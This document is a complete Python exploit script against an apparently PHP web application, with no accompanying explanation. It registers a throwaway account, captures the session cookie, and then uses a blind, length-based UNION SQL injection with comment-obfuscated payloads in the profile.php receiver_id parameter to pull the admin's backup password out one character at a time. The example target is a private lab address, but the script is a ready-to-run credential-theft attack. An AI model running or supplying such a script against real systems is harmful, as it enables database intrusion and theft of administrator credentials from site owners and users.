#!/usr/bin/env python3

import requests 
import traceback 
import argparse 
from urllib.parse import urljoin
import sys

PROXY = {"http": "http://127.0.0.1:8080"}

def crtAcc(target):
    """
    Create account and login
    """
    crtAccUrl = urljoin(target, "/pages/sign-up.php")
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    username = "johndoe"
    password = "Password!1234"

    crtAccData = {
        "username": username,
        "first_name": "John",
        "last_name": "Doe",
        "email": "john@doe.ltd",
        "password": password,
        "confirm_password": password,
        "remember-me": "on"
    }

    try:
        print("[*] Creating new user account...")
        crtAccRes = requests.post(crtAccUrl, headers=headers, data=crtAccData, allow_redirects=False)

        if crtAccRes.status_code == 302:
            print(f"[+] Account {username}:{password} has been created.")

            # Login
            lgnUrl = urljoin(target, "/pages/sign-in.php")
            lgnData = {"username": username, "password": password, "remember-me": "on", "sign_in": ''}

            try:
                lgnRes = requests.post(lgnUrl, headers=headers, data=lgnData, allow_redirects=False)

                # Use cookies dict instead of parsing headers
                if 'PHPSESSID' in lgnRes.cookies:
                    PHPSESSID_value = lgnRes.cookies['PHPSESSID']
                    print("[+] Logged in successfully")
                    print(f"[+] Cookie: PHPSESSID={PHPSESSID_value}")
                    return PHPSESSID_value
                else:
                    print("[-] Could not extract PHPSESSID from cookies")
                    return None

            except Exception as e:
                print("[-] Error logging in:", e)
                traceback.print_exc()
                return None
        else:
            print(f"[-] Account creation failed, status: {crtAccRes.status_code}")
            return None

    except Exception as e:
        print("[-] Error creating new user account:", e)
        traceback.print_exc()
        return None

def exfil_admin_bkb_password(target, PHPSESSID):
    """
    Determine backup password length
    """
    cookies = {"PHPSESSID": f"{PHPSESSID}"}
    length = 0
    while True:
        length = length + 1
        dtLengthUrl = urljoin(target, f"/pages/profile.php?user_id=1&receiver_id=1/**/UNION/**/SELECT/**/1,2,(SELECT/**/IF(LENGTH((SELECT/**/backup_password/**/FROM/**/users/**/WHERE/**/id=1))={length},(SELECT/**/table_name/**/FROM/**/information_schema.tables),'a')),4--")
        dtLengthRes = requests.get(dtLengthUrl, cookies=cookies)
        resLength = len(dtLengthRes.content)
        if resLength > 14800 and resLength < 15000:
            print(f"[+] Admin's backup password length = {length}")
            break
    """
    Exfiltrate the admin's backup_password 
    """
    print("[*] Exfiltrating the admin's backup password")
    admin_backup_password = ""
    for pos in range(1, int(length) + 1):
        for ascii_code in range(32, 126):
            exfilBkbPassUrl = urljoin(target, f"/pages/profile.php?user_id=1&receiver_id=1/**/UNION/**/SELECT/**/1,2,(SELECT/**/IF(ASCII(SUBSTR((SELECT/**/backup_password/**/FROM/**/users/**/WHERE/**/id=1),{pos},1))={ascii_code},(SELECT/**/table_name/**/FROM/**/information_schema.tables),'a')),4--")
            efilPassRes = requests.get(exfilBkbPassUrl, cookies=cookies)
            resLength = len(efilPassRes.content)
            if resLength > 14800 and resLength < 15000:
                admin_backup_password = admin_backup_password + chr(ascii_code)
                sys.stdout.write(chr(ascii_code))
                sys.stdout.flush()
                break
    print(f"\n[+] Admin's backup password: ", admin_backup_password)
    return admin_backup_password


def main():
    parser = argparse.ArgumentParser(description="SQLI Exfiltrate Admin's Backup Password")
    parser.add_argument("target", help="target's base URL (e.g, http://192.168.174.234:80/)")
    args = parser.parse_args()

    johnAuthToken = crtAcc(args.target)
    if johnAuthToken:
        exfil_admin_bkb_password(args.target, johnAuthToken)


if __name__ == "__main__":
    main()
